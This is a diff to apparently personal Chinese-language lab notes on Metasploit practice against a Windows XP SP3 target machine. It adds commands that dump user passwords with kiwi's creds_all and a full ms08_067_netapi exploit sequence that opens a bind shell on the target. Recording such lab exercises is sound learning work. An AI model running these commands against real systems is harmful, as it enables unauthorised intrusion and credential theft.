@@ -5,6 +5,26 @@ show targets 显示有漏洞的操作系统
 set target 34  不加这句 会提示expoit成功 创建会话失败
 exploit      必须要关防火墙 不然失败
 run vnc
+load kiwi
+creds_all  返回用户密码
+
+
+msf > search ms08_067
+msf > use exploit/windows/smb/ms08_067_netapi
+msf  exploit(ms08_067_netapi) > set RHOST 192.168.229.137
+msf  exploit(ms08_067_netapi) > set payload windows/shell_bind_tcp
+msf  exploit(ms08_067_netapi) > exploit
+
+不返回meterpeter返回cmd  shell
+
+
+
+
+
+
+
+
+
 
 下载靶机  
 Windows XP Professional with Service Pack 3 (x86) - CD (Chinese-Simplified) 2008-05-01   失败   2022-12-9 成功 
